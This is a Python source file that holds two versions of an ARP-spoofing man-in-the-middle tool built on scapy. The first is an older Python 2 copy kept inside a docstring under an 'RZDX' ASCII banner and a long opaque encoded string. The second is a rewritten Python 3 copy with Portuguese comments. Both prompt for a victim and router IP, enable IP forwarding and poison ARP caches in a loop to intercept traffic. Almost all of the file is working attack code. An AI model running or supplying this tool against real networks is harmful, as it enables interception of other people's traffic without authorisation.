"""
#
#  8 888888888o.    8888888888',8888' 8 888888888o.   `8.`8888.      ,8'
#  8 8888    `88.          ,8',8888'  8 8888    `^888. `8.`8888.    ,8'
#  8 8888     `88         ,8',8888'   8 8888        `88.`8.`8888.  ,8'
#  8 8888     ,88        ,8',8888'    8 8888         `88 `8.`8888.,8'
#  8 8888.   ,88'       ,8',8888'     8 8888          88  `8.`88888'
#  8 888888888P'       ,8',8888'      8 8888          88  .88.`8888.
#  8 8888`8b          ,8',8888'       8 8888         ,88 .8'`8.`8888.
#  8 8888 `8b.       ,8',8888'        8 8888        ,88'.8'  `8.`8888.
#  8 8888   `8b.    ,8',8888'         8 8888    ,o88P' .8'    `8.`8888.
#  8 8888     `88. ,8',8888888888888  8 888888888P'   .8'      `8.`8888.
------------------------------------------------------------------------------------------------------------------------
UslwDV6Gkjz4sPX4sqIXJ3P8_SftK6_K0CRHotk47Qpz_P0n7SuvytAkR6LZOO0Kc_z9J-0rr8rQJEei2TjtCoIVd9BxX6QArjZMv23CdSxANtPmvr_
KyDYNjq65OuFyiGScnbwSSW8K6gGL62MRmNWm7tgfb0lYI9rIWql74g6SbVPg05eOscuFI0KiO5rw1LixCGAjObs3ULgt4mm1OmWOWTAn1y14Q46x054dw
PW1cpZ5O8dbvYZ1Dg7Ut_LcOlMhLubZnU_C7oJIu08aJRm3Spl52y_Qj-Dyhyc90yWfenAvNAwbT36DDtI1u9vZhGcuvKp3W3t_B3I3j-VNEg5xOthJRrTJt
BGZwOcFJxrHMwBHv-ZYLk39kqnjyvo0QCtr49Wf8mAwwURoajaPYGC2ey-b_HIstnMVfn6WOPXag7MgP_rcy9ZrRhej_qzq0Hc-kA_THfeqZif7HiFbLK8Z
3kVViW1mLb7jMvW1f4VZdyizFKYh3NgVM8T7NL1sObvP_9klhLTNX3hxoVgrk3_VWnlCFrHMlQNcru8YJaIYayGN0fPNPuQB9Y8ARp-rBwwSklldyGQbNb-
HKxyVaOt7pWHPT_C5l2KM3mDoe8ag_vEZGB0p19qiGMvRmRTh1q7f1iBCgwmX16pwJ-ddKeqjQrONADGXEyK4Hr39WI1i2cxffTB_zVgXcf0RQ88CJ3bI08p
5apn9y5EFKBE-bhxu5d9a2p3MiSzD0F_CXMdxC_OFdsihc9QPIDuaTqbzNlhtr96Ug8dMFTe6_mwxKs1Nw84A4ktAfd8ytjkHDqJrwdCcmNKs1YxVR-HMaGR
TT5cDrr-nRkcjLAPG6wHO6rLfmbaSDPhtNCCWJSXAfeAjd1t4z7ZkKQneuLYRnlrkDmaJ6D1tQJ5AzFmaMXm2LlM1RdyrhXWRq2wzuZKCAPPBtz2xxUWF8Kah
x7-WAEtjgrv9ykuUyNy17mDzZoJTIIjf8Yy957Jwf2SOSHADCrWTgAoqU54inRk7r20Lws4D9CMB0z5NciY-3vXZT6t0LdL0FInQXe-v05ecJ-aiiJekBv0k
0KrT_0CqtdEK2OI0EWXic2PipufsCjzP7fsLYg
------------------------------------------------------------------------------------------------------------------------

import os
import time
import sys
from scapy.all import *


# get what we are messing with
def getInfo():
    print("~~~Getting addresses...")
    interface = input("Interface (en0 is Macbook Wifi):")
    victimIP = input("Victim IP:")
    routerIP = input("Router IP:")
    return [interface, victimIP, routerIP]


# turn on port forwarding until restart
def setIPForwarding(toggle):
    if (toggle == True):
        print("~~~Turing on IP forwarding...")
        # for OSX
        os.system('sysctl -w net.inet.ip.forwarding=1')

    # other
    # os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    if (toggle == False):
        print("~~~Turing off IP forwarding...")
        # for OSX
        os.system('sysctl -w net.inet.ip.forwarding=0')

    # other
    # os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')


# need to get mac addresses of vitcim and router
# do this by generating ARP requests, which are made
# for getting MAC addresses
def get_MAC(ip, interface):
    # set verbose to 0, least stuff printed (range: 0-4) (4 is max I think)
    # conf.verb = 4

    # srp() send/recive packets at layer 2 (ARP)
    # Generate a Ether() for ethernet connection/ARP request (?)
    # timeout 2, units seconds(?)
    # interface, wlan0, wlan1, etc...
    # inter, time .1 seconds to retry srp()
    # returns  IDK yet
    answer, unanswer = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, iface=interface, inter=0.1)

    # I'm not exactly sure as to what how this works, but it gets the data we need
    for send, recieve in answer:
        return recieve.sprintf(r"%Ether.src%")


# this is too restablish the connection between the router
# and victim after we are done intercepting IMPORTANT
# victim will notice very quickly if this isn't done
def reassignARP(victimIP, routerIP, interface):
    print("~~~Reassigning ARPS...")

    # get victimMAC
    victimMAC = get_MAC(victimIP, interface)

    # get routerMAC
    routerMAC = get_MAC(routerIP, interface)

    # send ARP request to router as-if from victim to connect,
    # do it 7 times to be sure
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC, retry=7))

    # send ARP request to victim as-if from router to connect
    # do it 7 times to be sure
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC, retry=7))

    # don't need this anymore
    setIPForwarding(False)


# this is the actuall attack
# sends a single ARP request to both targets
# saying that we are the other the other target
# so it's puts us inbetween!
# funny how it's the smallest bit of code
def attack(victimIP, victimMAC, routerIP, routerMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))


def manInTheMiddle():
    info = getInfo()
    # info = ['en0', '162.246.145.218', '10.141.248.214']
    setIPForwarding(True)

    print("~~~Getting MACs...")
    try:
        victimMAC = get_MAC(info[1], info[0])
    except Exception, e:
        setIPForwarding(False)
        print("~!~Error getting victim MAC...")
        print(e)
        sys.exit(1)

    try:
        routerMAC = get_MAC(info[2], info[0])
    except Exception, e:
        setIPForwarding(False)
        print("~!~Error getting router MAC...")
        print(e)
        sys.exit(1)

    print("~~~Victim MAC: %s" % victimMAC)
    print("~~~Router MAC: %s" % routerMAC)
    print("~~~Attacking...")

    while True:
        try:
            attack(info[1], victimMAC, info[2], routerMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reassignARP(info[1], info[2], info[0])
            break
    sys.exit(1)


manInTheMiddle()"""

import os
import time
import sys
from scapy.all import send, srp, conf
from scapy.layers.l2 import Ether, ARP


def get_info():
    """
    Solicita as informações necessárias ao usuário:
    Interface, IP da vítima e IP do roteador.
    """
    print("~~~ Obtendo informações...")
    interface = input("Interface (ex.: en0 para Wi-Fi no macOS): ").strip()
    victim_ip = input("IP da vítima: ").strip()
    router_ip = input("IP do roteador: ").strip()
    return interface, victim_ip, router_ip


def set_ip_forwarding(enable):
    """
    Ativa ou desativa o encaminhamento de pacotes IP no sistema.
    :param enable: True para ativar, False para desativar.
    """
    action = "ativando" if enable else "desativando"
    print(f"~~~ {action.capitalize()} o encaminhamento de IP...")
    command = "sysctl -w net.inet.ip.forwarding={}".format(1 if enable else 0)
    os.system(command)


def get_mac(ip, interface):
    """
    Obtém o endereço MAC associado a um endereço IP.
    :param ip: Endereço IP alvo.
    :param interface: Interface de rede a ser usada.
    :return: Endereço MAC do alvo.
    """
    print(f"~~~ Obtendo MAC para {ip}...")
    try:
        answered, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2,
            iface=interface,
            inter=0.1,
            verbose=0
        )
        for _, received in answered:
            return received[Ether].src
    except Exception as e:
        raise RuntimeError(f"Erro ao obter MAC para {ip}: {e}")


def restore_arp(victim_ip, victim_mac, router_ip, router_mac, interface):
    """
    Restaura a tabela ARP da vítima e do roteador.
    :param victim_ip: IP da vítima.
    :param victim_mac: MAC da vítima.
    :param router_ip: IP do roteador.
    :param router_mac: MAC do roteador.
    :param interface: Interface de rede usada.
    """
    print("~~~ Restaurando tabelas ARP...")
    for _ in range(5):  # Envia múltiplos pacotes para garantir a restauração
        send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), verbose=0)
        send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=router_mac), verbose=0)
    set_ip_forwarding(False)


def arp_spoof(victim_ip, victim_mac, router_ip, router_mac):
    """
    Executa o ataque ARP spoofing.
    :param victim_ip: IP da vítima.
    :param victim_mac: MAC da vítima.
    :param router_ip: IP do roteador.
    :param router_mac: MAC do roteador.
    RZDX
    """
    send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac), verbose=0)
    send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac), verbose=0)


def main():
    """
    Função principal que gerencia a execução do ataque e sua interrupção.
    """
    try:
        interface, victim_ip, router_ip = get_info()
        set_ip_forwarding(True)

        print("~~~ Obtendo endereços MAC...@@@")
        victim_mac = get_mac(victim_ip, interface)
        router_mac = get_mac(router_ip, interface)

        print(f"~~~ MAC da vítima: {victim_mac}@@@")
        print(f"~~~ MAC do roteador: {router_mac}")
        print("~~~ Iniciando ataque ARP spoofing... Pressione Ctrl+C para interromper.")

        while True:
            arp_spoof(victim_ip, victim_mac, router_ip, router_mac)
            time.sleep(2)  # Tempo entre os pacotes

    except KeyboardInterrupt:
        print("\n~~~ Interrompendo e restaurando tabelas ARP...@@@")
        restore_arp(victim_ip, victim_mac, router_ip, router_mac, interface)
        print("~~~ Finalizado com sucesso.")

    except Exception as e:
        print(f"~!~ Erro: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
